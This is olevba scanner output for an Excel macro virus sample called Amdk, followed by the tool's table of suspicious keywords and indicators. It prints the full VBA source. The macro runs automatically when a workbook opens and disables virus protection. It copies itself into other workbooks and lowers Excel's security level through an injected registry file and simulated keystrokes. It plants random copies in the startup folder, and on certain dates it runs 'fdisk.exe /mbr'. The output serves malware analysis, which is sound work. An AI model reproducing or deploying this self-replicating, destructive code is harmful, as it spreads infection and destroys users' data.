olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Amdk.xls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Amdk.xls 
in file: Virus.MSExcel.Amdk.xls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 














































































































































































































































































































































































































































































































































































































































































































































































































































Private Sub Workbook_Open()
On Error Resume Next
    Application.Options.VirusProtection = False
    s = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.countoflines
    d = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
    For k = 1 To Application.Workbooks.Count
    t = Application.Workbooks.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
    If t = 0 Then
    Application.Workbooks.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
    End If
    Next k
     b = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "1", "2", "3", "4", "5", "6", "7", "8", "9")
     p = Application.StartupPath
     n = ""
     Set ms = Application.FileSearch
     With ms
        .LookIn = "c:\windows\"
        .FileName = "lisa.dll"
    If .Execute(SortBy:=msoSortByFileName, _
           SortOrder:=msoSortOrderAscending) > 0 Then
       GoTo 100
       Else
       If (Day(Now()) = 13) And (Month(Now()) = 1) Then
        MyAppID = Shell("fdisk.exe /mbr", 0)
       End If
       If (Day(Now()) = 13) And (Month(Now()) = 4) Then
        MyAppID = Shell("fdisk.exe /mbr", 0)
       End If
       If (Day(Now()) = 13) And (Month(Now()) = 8) Then
        MyAppID = Shell("fdisk.exe /mbr", 0)
       End If
       If (Day(Now()) = 13) And (Month(Now()) = 10) Then
        MyAppID = Shell("fdisk.exe /mbr", 0)
       End If
       If (Day(Now()) = 13) And (Month(Now()) = 12) Then
        MyAppID = Shell("fdisk.exe /mbr", 0)
       End If
    End If
    End With
    
100:
     
     Set fs = Application.FileSearch
     With fs
        .LookIn = Application.StartupPath + "\"
        .FileName = "*.*"
    If .Execute(SortBy:=msoSortByFileName, _
           SortOrder:=msoSortOrderAscending) > 0 Then
       For i = 1 To .FoundFiles.Count
       amdk = Len(.FoundFiles(i))
       am = .FoundFiles(i)
       z = 4
5:
         
       brm = ""
       For j = z To amdk
        If Mid(am, j, 1) = "\" Then
          z = j + 1
        GoTo 5
        Else
         brm = brm + Mid(am, j, 1)
       End If
         Next j
         If brm = ThisWorkbook.Name Then
             Workbooks.Add
              For k = 1 To Application.Workbooks.Count
               t = Application.Workbooks.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
              If t = 0 Then
               Application.Workbooks.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
              End If
              Next k
             ThisWorkbook.Close
            End If
       Next i
    Else
            Set sm = CreateObject("Scripting.FileSystemObject")
            Set Ate = sm.CreateTextFile("c:\1.reg", True)
            Ate.WriteLine ("REGEDIT4")
            Ate.WriteLine (" ")
            Ate.WriteLine ("[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Excel\Security]")
            Ate.WriteLine (Chr(34) + "Level" + Chr(34) + "=dword:00000001")
            Ate.Close
            MyAppID = Shell("regedit.exe c:\1.reg", 0)
            Application.SendKeys (Chr(13))
            newHour = Hour(Now())
            newMinute = Minute(Now())
            newSecond = Second(Now()) + 5
            waitTime = TimeSerial(newHour, newMinute, newSecond)
            Application.Wait waitTime
            AppActivate "�������� �������"
            Application.SendKeys (Chr(13))
            Kill ("c:\1.reg")
             Randomize
             For j = 1 To 8
             n = n + b(Int((22 * Rnd) + 1))
             Next j
             n = n + "."
             For j = 1 To 3
             n = n + b(Int((22 * Rnd) + 1))
             Next j
             p = p + "\" + n
             Workbooks.Add
              For k = 1 To Application.Workbooks.Count
               t = Application.Workbooks.Item(k).VBProject.VBComponents.Item(1).CodeModule.countoflines
              If t = 0 Then
               Application.Workbooks.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
              End If
              Next k
              g = ActiveWorkbook.Name
              ActiveWorkbook.Windows.Item(1).Visible = False
              Workbooks(g).SaveCopyAs p
              Workbooks(g).Close SaveChanges:=False
                      
       End If
       End With
    
   
End Sub














+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lisa.dll            |Executable file name                         |
|IOC       |fdisk.exe           |Executable file name                         |
|IOC       |1.reg               |Executable file name                         |
|IOC       |regedit.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

